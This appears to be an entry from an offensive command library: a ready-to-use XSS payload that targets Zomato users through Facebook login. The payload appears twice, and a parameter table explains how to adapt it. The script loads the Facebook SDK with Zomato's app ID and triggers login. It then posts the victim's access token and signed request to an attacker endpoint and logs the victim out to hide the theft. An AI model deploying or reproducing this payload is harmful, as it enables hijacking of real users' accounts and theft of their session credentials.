---
id: cmd-632017-02
data: >-
  <script>// load fb js-sdk (function(d, s, id){ var js, fjs =
  d.getElementsByTagName(s)[0]; if(d.getElementById(id)){return;}  js =
  d.createElement(s); js.id = id;  js.src
  ="//connect.facebook.net/en_US/sdk.js";  fjs.parentNode.insertBefore(js, fjs);
  }(document,'script','facebook-jssdk')); window.fbAsyncInit=function(){
  FB.init({ appId:'288523881080',// zomato fb app id xfbml:true, version:'v3.1'
  });  //get auth response ( accessToken and signedRequest )
  FB.login(function(){ 
  $.post('https://attacker.com/tokens.php',FB.getAuthResponse())});// send token
  and signed_request to attacker document.location.href
  ='https://www.zomato.com/logout';// logout from victims's account }); 
  }</script>
tags:
  - xss
  - token-theft
  - javascript
type: command
output: null
executor: html
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:49.935Z'
verified: false
validated: true
submitted: true
---
# xss-payload-fb-token-steal

## Command

```html
<script>// load fb js-sdk (function(d, s, id){ var js, fjs = d.getElementsByTagName(s)[0]; if(d.getElementById(id)){return;}  js = d.createElement(s); js.id = id;  js.src ="//connect.facebook.net/en_US/sdk.js";  fjs.parentNode.insertBefore(js, fjs); }(document,'script','facebook-jssdk')); window.fbAsyncInit=function(){ FB.init({ appId:'288523881080',// zomato fb app id xfbml:true, version:'v3.1' });  //get auth response ( accessToken and signedRequest ) FB.login(function(){  $.post('https://attacker.com/tokens.php',FB.getAuthResponse())});// send token and signed_request to attacker document.location.href ='https://www.zomato.com/logout';// logout from victims's account });  }</script>
```

## Description

JavaScript payload for XSS that loads Facebook SDK, initializes with Zomato's app ID, logs in to get authResponse, posts tokens to attacker, and logs out the session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| appId | Facebook app ID (e.g., '288523881080') | Yes |
| $.post URL | Attacker's endpoint (e.g., 'https://attacker.com/tokens.php') | Yes |
| document.location.href | Logout URL (e.g., 'https://www.zomato.com/logout') | Yes |

## Examples

### Basic Usage

```html
<script>/* simplified load and post */</script>
```

### Advanced Usage

```html
# Full payload as above, embedded in with_tags_data
```

## Expected Output

FB SDK loads; authResponse POSTed to attacker (e.g., JSON with accessToken, signedRequest); redirect to logout.

## Related

- [[commands/submit-review-xss]]
- [[procedures/Trigger-XSS-via-Review-Edit]]
